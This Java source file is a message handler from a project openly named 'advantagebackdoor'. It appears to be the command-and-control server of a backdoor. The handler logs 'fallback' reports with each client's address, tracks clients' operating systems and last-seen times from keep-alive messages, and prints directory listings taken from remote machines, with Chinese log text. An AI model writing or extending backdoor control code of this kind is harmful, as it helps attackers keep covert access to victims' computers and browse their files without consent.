package me.faintcloudy.advantagebackdoor.server.message;

import me.faintcloudy.advantagebackdoor.server.Log4jServer;
import me.faintcloudy.advantagebackdoor.api.message.MessageHandler;
import me.faintcloudy.advantagebackdoor.api.message.MessageListener;
import me.faintcloudy.advantagebackdoor.api.message.play.client.DirectoryMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.client.FallbackMessage;
import me.faintcloudy.advantagebackdoor.api.message.play.client.KeepAliveMessage;

public class BasicMessageHandler implements MessageListener {

    @MessageHandler
    public void onFallback(FallbackMessage message)
    {
        Log4jServer.getInstance().getLogger().info("Received a fallback from " + message.getUser().getAddress() + ": " + message.getFallback());
    }

    @MessageHandler
    public void onKeepAliveMessage(KeepAliveMessage message)
    {
        message.getUser().setOS(message.getOS());
        message.getUser().setLastMessageTime(System.currentTimeMillis());
    }

    @MessageHandler
    public void onDirectoryMessage(DirectoryMessage message)
    {
        Log4jServer.getInstance().getLogger().info("来自 " + message.getUser() + " 的 " + message.from + " 目录下: ");
        Log4jServer.getInstance().getLogger().info("文件夹: ");
        if (message.folders.isEmpty()) {
            Log4jServer.getInstance().getLogger().info(" - 空!");
        } else {
            for (String folder : message.folders) {
                Log4jServer.getInstance().getLogger().info(" - " + folder);
            }
        }
        Log4jServer.getInstance().getLogger().info("文件: ");
        if (message.files.isEmpty()) {
            Log4jServer.getInstance().getLogger().info(" - 空!");
        } else {
            for (String file : message.files) {
                Log4jServer.getInstance().getLogger().info(" - " + file);
            }
        }


    }
}
